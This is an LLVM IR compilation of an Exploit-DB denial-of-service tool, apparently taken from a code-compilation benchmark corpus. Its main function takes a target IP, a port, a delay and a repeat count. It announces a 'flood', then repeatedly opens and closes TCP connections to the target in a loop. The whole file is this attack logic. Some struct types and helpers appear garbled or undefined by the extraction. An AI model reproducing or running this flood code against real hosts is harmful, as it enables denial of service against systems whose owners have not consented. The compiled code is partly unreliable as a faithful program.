; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/multiple/dos/extr_21126.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/multiple/dos/extr_21126.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.sockaddr_in = type { i8*, %struct.TYPE_4__, i8*, %struct.TYPE_3__, i8*, i8* }
%struct.TYPE_4__ = type { i32 }
%struct.TYPE_3__ = type { i32 }
%struct.sockaddr_in6 = type { i8*, %struct.TYPE_4__, i8*, %struct.TYPE_3__, i8*, i8* }
%struct.sockaddr = type { i32 }

@DEFT = common dso_local global i32 0, align 4
@DEFP = common dso_local global i32 0, align 4
@TIME = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [50 x i8] c"Usage: %s [-6] ip4/6 [port] [delay (ms)] [times]\0A\00", align 1
@.str.1 = private unnamed_addr constant [3 x i8] c"-6\00", align 1
@stderr = common dso_local global i32 0, align 4
@.str.2 = private unnamed_addr constant [36 x i8] c"Invalid port number. Using default\0A\00", align 1
@.str.3 = private unnamed_addr constant [49 x i8] c"Started with %s flood to %s on %d for %d times!\0A\00", align 1
@.str.4 = private unnamed_addr constant [5 x i8] c"ipv6\00", align 1
@.str.5 = private unnamed_addr constant [5 x i8] c"ipv4\00", align 1
@AF_INET = common dso_local global i8* null, align 8
@SOCK_STREAM = common dso_local global i32 0, align 4
@.str.6 = private unnamed_addr constant [20 x i8] c"connect %d failed.\0A\00", align 1
@.str.7 = private unnamed_addr constant [8 x i8] c"connect\00", align 1
@.str.8 = private unnamed_addr constant [19 x i8] c"Connection no. %d\0A\00", align 1
@AF_INET6 = common dso_local global i8* null, align 8

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca %struct.sockaddr_in, align 8
  %14 = alloca i8*, align 8
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i32 0, i32* %9, align 4
  %15 = load i32, i32* @DEFT, align 4
  store i32 %15, i32* %10, align 4
  %16 = load i32, i32* @DEFP, align 4
  store i32 %16, i32* %11, align 4
  %17 = load i32, i32* @TIME, align 4
  store i32 %17, i32* %12, align 4
  %18 = load i32, i32* %4, align 4
  %19 = icmp slt i32 %18, 2
  br i1 %19, label %20, label %37

20:                                               ; preds = %2
  %21 = load i8**, i8*** %5, align 8
  %22 = getelementptr inbounds i8*, i8** %21, i64 0
  %23 = load i8*, i8** %22, align 8
  %24 = call i8* @strrchr(i8* %23, i8 signext 47)
  store i8* %24, i8** %14, align 8
  %25 = icmp ne i8* %24, null
  br i1 %25, label %30, label %26

26:                                               ; preds = %20
  %27 = load i8**, i8*** %5, align 8
  %28 = getelementptr inbounds i8*, i8** %27, i64 0
  %29 = load i8*, i8** %28, align 8
  store i8* %29, i8** %14, align 8
  br label %33

30:                                               ; preds = %20
  %31 = load i8*, i8** %14, align 8
  %32 = getelementptr inbounds i8, i8* %31, i32 1
  store i8* %32, i8** %14, align 8
  br label %33

33:                                               ; preds = %30, %26
  %34 = load i8*, i8** %14, align 8
  %35 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([50 x i8], [50 x i8]* @.str, i64 0, i64 0), i8* %34)
  %36 = call i32 @exit(i32 0) #3
  unreachable

37:                                               ; preds = %2
  %38 = load i8**, i8*** %5, align 8
  %39 = getelementptr inbounds i8*, i8** %38, i64 1
  %40 = load i8*, i8** %39, align 8
  %41 = call i32 @strcmp(i8* %40, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.1, i64 0, i64 0))
  %42 = icmp ne i32 %41, 0
  br i1 %42, label %48, label %43

43:                                               ; preds = %37
  %44 = load i8**, i8*** %5, align 8
  %45 = getelementptr inbounds i8*, i8** %44, i32 1
  store i8** %45, i8*** %5, align 8
  %46 = load i32, i32* %4, align 4
  %47 = add nsw i32 %46, -1
  store i32 %47, i32* %4, align 4
  br label %48

48:                                               ; preds = %43, %37
  %49 = load i32, i32* %4, align 4
  %50 = icmp sgt i32 %49, 2
  br i1 %50, label %51, label %64

51:                                               ; preds = %48
  %52 = load i8**, i8*** %5, align 8
  %53 = getelementptr inbounds i8*, i8** %52, i64 2
  %54 = load i8*, i8** %53, align 8
  %55 = call i32 @strtol(i8* %54, i32* null, i32 10)
  store i32 %55, i32* %11, align 4
  %56 = load i32, i32* %11, align 4
  %57 = call i32 @VALID_PORT(i32 %56)
  %58 = icmp ne i32 %57, 0
  br i1 %58, label %63, label %59

59:                                               ; preds = %51
  %60 = load i32, i32* @stderr, align 4
  %61 = call i32 @fprintf(i32 %60, i8* getelementptr inbounds ([36 x i8], [36 x i8]* @.str.2, i64 0, i64 0))
  %62 = load i32, i32* @DEFP, align 4
  store i32 %62, i32* %11, align 4
  br label %63

63:                                               ; preds = %59, %51
  br label %64

64:                                               ; preds = %63, %48
  %65 = load i32, i32* %4, align 4
  %66 = icmp sgt i32 %65, 3
  br i1 %66, label %67, label %72

67:                                               ; preds = %64
  %68 = load i8**, i8*** %5, align 8
  %69 = getelementptr inbounds i8*, i8** %68, i64 3
  %70 = load i8*, i8** %69, align 8
  %71 = call i32 @strtol(i8* %70, i32* null, i32 10)
  store i32 %71, i32* %12, align 4
  br label %72

72:                                               ; preds = %67, %64
  %73 = load i32, i32* %4, align 4
  %74 = icmp sgt i32 %73, 4
  br i1 %74, label %75, label %80

75:                                               ; preds = %72
  %76 = load i8**, i8*** %5, align 8
  %77 = getelementptr inbounds i8*, i8** %76, i64 4
  %78 = load i8*, i8** %77, align 8
  %79 = call i32 @strtol(i8* %78, i32* null, i32 10)
  store i32 %79, i32* %10, align 4
  br label %80

80:                                               ; preds = %75, %72
  %81 = load i32, i32* %9, align 4
  %82 = icmp eq i32 %81, 1
  %83 = zext i1 %82 to i64
  %84 = select i1 %82, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.4, i64 0, i64 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.5, i64 0, i64 0)
  %85 = load i8**, i8*** %5, align 8
  %86 = getelementptr inbounds i8*, i8** %85, i64 1
  %87 = load i8*, i8** %86, align 8
  %88 = load i32, i32* %11, align 4
  %89 = load i32, i32* %10, align 4
  %90 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([49 x i8], [49 x i8]* @.str.3, i64 0, i64 0), i8* %84, i8* %87, i32 %88, i32 %89)
  store i32 0, i32* %8, align 4
  br label %91

91:                                               ; preds = %128, %80
  %92 = load i32, i32* %8, align 4
  %93 = load i32, i32* %10, align 4
  %94 = icmp slt i32 %92, %93
  br i1 %94, label %95, label %131

95:                                               ; preds = %91
  %96 = load i8*, i8** @AF_INET, align 8
  %97 = load i32, i32* @SOCK_STREAM, align 4
  %98 = call i32 @socket(i8* %96, i32 %97, i32 0)
  store i32 %98, i32* %7, align 4
  %99 = bitcast %struct.sockaddr_in* %13 to %struct.sockaddr_in6*
  %100 = call i32 @memset(%struct.sockaddr_in6* %99, i32 0, i32 48)
  %101 = load i8*, i8** @AF_INET, align 8
  %102 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 2
  store i8* %101, i8** %102, align 8
  %103 = load i8**, i8*** %5, align 8
  %104 = getelementptr inbounds i8*, i8** %103, i64 1
  %105 = load i8*, i8** %104, align 8
  %106 = call i32 @inet_addr(i8* %105)
  %107 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 1
  %108 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %107, i32 0, i32 0
  store i32 %106, i32* %108, align 8
  %109 = load i32, i32* %11, align 4
  %110 = call i8* @htons(i32 %109)
  %111 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 0
  store i8* %110, i8** %111, align 8
  %112 = load i32, i32* %7, align 4
  %113 = bitcast %struct.sockaddr_in* %13 to %struct.sockaddr*
  %114 = call i32 @connect(i32 %112, %struct.sockaddr* %113, i32 48)
  store i32 %114, i32* %6, align 4
  %115 = load i32, i32* %6, align 4
  %116 = icmp slt i32 %115, 0
  br i1 %116, label %117, label %121

117:                                              ; preds = %95
  %118 = load i32, i32* %8, align 4
  %119 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.6, i64 0, i64 0), i32 %118)
  %120 = call i32 @perror(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.7, i64 0, i64 0))
  br label %131

121:                                              ; preds = %95
  %122 = load i32, i32* %8, align 4
  %123 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.8, i64 0, i64 0), i32 %122)
  %124 = load i32, i32* %7, align 4
  %125 = call i32 @close(i32 %124)
  %126 = load i32, i32* %12, align 4
  %127 = call i32 @usleep(i32 %126)
  br label %128

128:                                              ; preds = %121
  %129 = load i32, i32* %8, align 4
  %130 = add nsw i32 %129, 1
  store i32 %130, i32* %8, align 4
  br label %91

131:                                              ; preds = %117, %91
  %132 = load i32, i32* %3, align 4
  ret i32 %132
}

declare dso_local i8* @strrchr(i8*, i8 signext) #1

declare dso_local i32 @printf(i8*, ...) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i32 @strcmp(i8*, i8*) #1

declare dso_local i32 @strtol(i8*, i32*, i32) #1

declare dso_local i32 @VALID_PORT(i32) #1

declare dso_local i32 @fprintf(i32, i8*) #1

declare dso_local i32 @socket(i8*, i32, i32) #1

declare dso_local i32 @memset(%struct.sockaddr_in6*, i32, i32) #1

declare dso_local i32 @inet_addr(i8*) #1

declare dso_local i8* @htons(i32) #1

declare dso_local i32 @connect(i32, %struct.sockaddr*, i32) #1

declare dso_local i32 @perror(i8*) #1

declare dso_local i32 @close(i32) #1

declare dso_local i32 @usleep(i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
